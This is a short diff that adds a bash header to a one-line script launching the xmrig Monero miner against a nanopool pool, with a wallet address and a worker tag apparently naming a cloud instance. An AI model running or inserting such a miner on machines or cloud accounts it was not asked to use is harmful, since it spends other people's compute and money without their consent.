@@ -1,1 +1,3 @@
+#!/bin/bash
+
 $PWD/xmrig -o xmr-us-west1.nanopool.org:14433 -u 43JTegeBq4T3XPutQrGYxDGZMsDjqkKuRSdeWRBy2zCGVBZ9gyxXS92Zwu4RkXzjzj1ANiyfBijR5WjxHCKAuDDsKu7iipB/gcp1/admin@admin.com --tls --coin monero --max-cpu-usage 80 -t 4
